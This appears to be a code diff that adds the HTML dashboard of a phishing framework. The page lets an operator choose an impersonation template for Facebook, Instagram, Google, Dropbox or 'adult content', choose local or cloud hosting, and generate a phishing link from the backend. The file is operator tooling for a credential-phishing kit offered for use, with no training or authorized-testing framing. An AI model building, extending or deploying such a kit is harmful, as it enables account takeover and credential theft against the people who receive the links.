@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Phishing Framework Dashboard</title>
+</head>
+<body>
+    <h1>Welcome to the Phishing Framework</h1>
+    <form id="generateForm" method="post" action="{{ url_for('main.generate_link') }}">
+        <label for="template">Select a phishing template:</label>
+        <select name="template" id="template">
+            <option value="facebook">Facebook</option>
+            <option value="instagram">Instagram</option>
+            <option value="google">Google</option>
+            <option value="dropbox">Dropbox</option>
+            <option value="adult">Adult Content</option>
+        </select>
+        <br><br>
+        <label>Select Hosting Option:</label><br>
+        <input type="radio" name="hosting" value="local" checked> Local Hosting<br>
+        <input type="radio" name="hosting" value="cloud"> Cloud Hosting<br><br>
+        <button type="submit">Generate Link</button>
+    </form>
+    <div id="result"></div>
+
+    <script>
+        document.getElementById('generateForm').onsubmit = function(e) {
+            e.preventDefault();
+            var formData = new FormData(this);
+            fetch("{{ url_for('main.generate_link') }}", {
+                method: "POST",
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                document.getElementById('result').innerHTML = 'Phishing Link: <a href="'+data.link+'" target="_blank">'+data.link+'</a>';
+            })
+            .catch(error => {
+                document.getElementById('result').innerHTML = 'Error generating link.';
+            });
+        };
+    </script>
+</body>
+</html>
